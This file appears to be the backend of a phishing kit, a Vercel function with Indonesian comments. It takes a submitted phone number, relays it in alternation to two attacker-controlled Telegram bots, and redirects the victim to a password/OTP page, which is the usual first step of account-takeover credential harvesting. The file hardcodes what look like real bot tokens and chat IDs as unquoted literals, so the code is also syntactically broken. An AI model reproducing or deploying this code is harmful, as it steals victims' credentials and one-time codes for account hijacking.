// === Konfigurasi 2 bot Telegram ===
const BOT1_TOKEN = process.env.BOT1_TOKEN;
const CHAT1_ID   = process.env.CHAT1_ID;

const BOT2_TOKEN = process.env.BOT2_TOKEN;
const CHAT2_ID   = process.env.CHAT2_ID;

// Toggle round-robin (bergantian kirim ke bot1 → bot2)
let lastBot = 1;

/**
 * Fungsi kirim pesan ke Telegram
 */
async function sendMessage(botToken, chatId, message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const payload = {
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const data = await response.json();
        return { success: response.ok, data };
    } catch (error) {
        console.error("Gagal kirim:", error);
        return { success: false, error: error.message };
    }
}

// === Handler utama Vercel Function ===
module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        res.status(405).send('Method Not Allowed');
        return;
    }

    const phone = req.body.phoneNumber;
    if (!phone) {
        res.status(400).send('Nomor telepon kosong');
        return;
    }

    // Format pesan
    const message = `
( NoHP | ${phone} )

- No HP : \`${phone}\`
Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Makassar' })}
    `;

    // Pilih bot sesuai urutan round-robin
    let botToken, chatId;
    if (lastBot === 1) {
        botToken = 7982924006:AAHeQSDcuVf0fnaYujbgZeUI2AreoRE8HSc;
        chatId   = 7495263260;
        lastBot  = 2; // next time → bot2
    } else {
        botToken = 7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM;
        chatId   = 5876510981;
        lastBot  = 1; // next time → bot1
    }

    // Kirim pesan
    await sendMessage(botToken, chatId, message);

    // Redirect user ke halaman OTP
    res.writeHead(302, { Location: '/Password/' });
    res.end();
};
